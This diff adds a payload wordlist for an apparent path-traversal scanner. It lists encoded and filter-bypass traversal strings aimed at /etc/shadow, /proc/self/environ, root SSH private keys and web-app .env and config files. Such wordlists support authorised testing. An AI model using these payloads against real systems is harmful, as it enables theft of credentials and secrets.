@@ -1,0 +1,77 @@
+# PathTravScan — LFI Payload Wordlist
+# Format: raw traversal sequences — prepended with base path by the engine
+# Lines starting with # are ignored
+
+# ── Basic traversals ──────────────────────────────────────────────────────────
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+# ── URL-encoded ───────────────────────────────────────────────────────────────
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+# ── Double URL-encoded ────────────────────────────────────────────────────────
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# ── Unicode ───────────────────────────────────────────────────────────────────
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+
+# ── Filter bypass ─────────────────────────────────────────────────────────────
+....//....//....//....////etc/passwd
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
+
+# ── Null byte ────────────────────────────────────────────────────────────────
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.html
+../../../../etc/passwd%00.php
+
+# ── Windows targets ───────────────────────────────────────────────────────────
+../../../../windows/win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+..%5c..%5c..%5c..%5cwindows%5cwin.ini
+../../../../boot.ini
+../../../../Windows/System32/drivers/etc/hosts
+
+# ── Deep traversal ────────────────────────────────────────────────────────────
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+
+# ── /etc/shadow ───────────────────────────────────────────────────────────────
+../../../../etc/shadow
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow
+..%2f..%2f..%2f..%2fetc%2fshadow
+
+# ── /etc/hosts ────────────────────────────────────────────────────────────────
+../../../../etc/hosts
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts
+
+# ── Proc filesystem ───────────────────────────────────────────────────────────
+../../../../proc/version
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../proc/net/tcp
+
+# ── SSH keys ─────────────────────────────────────────────────────────────────
+../../../../root/.ssh/id_rsa
+../../../../root/.ssh/authorized_keys
+../../../../home/www/.ssh/id_rsa
+
+# ── Web app configs ───────────────────────────────────────────────────────────
+../../../../var/www/html/.env
+../../../../var/www/html/wp-config.php
+../../../../var/www/html/config.php
+../../../../app/.env
+../../../../.env
